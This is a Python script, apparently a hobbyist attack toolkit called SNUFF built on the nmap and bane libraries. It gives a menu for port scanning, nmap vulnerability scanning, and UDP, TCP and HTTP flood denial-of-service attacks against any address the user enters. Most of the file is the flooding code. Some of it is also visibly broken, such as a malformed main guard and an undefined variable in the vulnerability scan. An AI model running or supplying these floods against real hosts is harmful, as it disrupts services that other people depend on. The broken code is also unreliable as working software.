#!/usr/bin/python3
# Tested only on linux systems - buggy on some windows sadly #
# Twitter : @YourAnonS0u1 #
# Bane - credits to Ala #
# Special thanks to c0stablf #
# Bane can be found here => https://github.com/AlaBouali/bane #
#---------------------------------------------------------------------#
#                                                                     #
#--------------#                                                      #
# Requirements #                                                      #
#--------------#                                                      #
#                                                                     #
# pip3 install nmap                                                   #
import nmap                                                           #
sc = nmap.PortScanner()                                               #
# pip3 install bane                                                   #
import bane                                                           #
#                                                                     #
# don't need anything.                                                #
import os                                                             #
#                                                                     #
#                                                                     #
#---------------------#                                               #
# End of requirements #                                               #
#---------------------#-----------------------------------------------#

#---------------#
#   GUI Design  #
#---------------#

#----------------#

print("""
.d8888. d8b   db db    db d88888b d88888b 
88'  YP 888o  88 88    88 88'     88'     
`8bo.   88V8o 88 88    88 88ooo   88ooo   
  `Y8b. 88 V8o88 88    88 88~~~   88~~~   
db   8D 88  V888 88b  d88 88      88      
`8888Y' VP   V8P ~Y8888P' YP      YP      
                                          
                                          """)
#----------------#

#----------------#
def main():
  n = input("1 - Network Scanner \ n2 - Vulnerability Detection \ n3 - Denial of Service Tool \ nSelect a number from 1 to 3:")


  if n == '1':
    nmap()
  if n == '2':
    vuln()
  if n == '3':
    flood()

  else:
    print("Please enter a valid number.")

def nmap():
  os.system("clear || cls")
  print("#-------------------- welcome to network scanner --------------------#")
  target = input("\nEnter the IP address of the destination: ")  
  sc.scan(target, '1-65536')
  print(sc.scaninfo())
  print(sc[target]['tcp'].keys())

def vuln():
  os.system("clear || cls")
  print("#-------------------- welcome to vulnerability scan --------------------#")
  url = input("\nenter target IP address: ")  
  print(os.system('nmap -sV --script=vulnscan.nse' +ip))

def flood():
  os.system("clear || cls")
  print("#-------------------- welcome to denial --------------------#")
  u = input("4 - Udp Flood\n5 - Tcp Flood\n6 - Http Flood\nChoose a number between 4 and 6: ")


  if u == '4':
    udp()
  if u == '5':
    tcp()
  if u == '6':
    http()

  else:
    print("Please enter a valid number.")

def udp():
  os.system("clear || cls")
  print("#-------------------- Udp Flood --------------------#")
  ip = input("\nEnter IP Address: ")
  port = input("\nPort: ")
  time = input("\nTime: ")
  bane.udp_flood(ip, p=port, min_size=10, max_size=20, duration=time, interval=0.001)

def tcp():
  os.system("clear || cls")
  print("#-------------------- Tcp Flood --------------------#")
  ip = input("\nEnter IP Address: ")
  port = input("\nPort: ")
  time = input("\nTime: ")
  thread = input("\nThreads: ")
  bane.tcp_flood(ip, p=port, min_size=10, max_size=20, duration=time, interval=0.001, threads=thread, timeout=5)

def http():
  os.system("clear || cls")
  print("#-------------------- Http Flood --------------------#")
  h = input("7 - Proxyless Http Flood\n8 - Basic Http Flood\nSelect a number from 1 to 2: ")

  if h == "7":
    httproxy()
  if h == "8":
    httpbasic()
  else:
    print("Please enter a valid number")
def httproxy():
  os.system("clear || cls")
  print("#-------------------- Proxy Http Flood --------------------#")
  ip = input("\nEnter IP/URL to attack: ")
  port = input("\nPort: ")
  time = input("\nTime: ")
  thread = input("\nThreads: ")
  bane.prox_http_flood(ip, p=port, duration=time,interval=0.001, threads=thread, timeout=5)

def httpbasic():
  os.system("clear || cls")
  print("#-------------------- Basic Http Flood --------------------#")
  ip = input("\nEnter IP/URL to attack: ")
  port = input("\nPort: ")
  time = input("\nTime: ")
  thread = input("\nThreads: ")
  bane.http_flood(ip, p=port, duration=time,interval=0.001, threads=thread, timeout=5)

#----------------#

if name == "main":
  main()
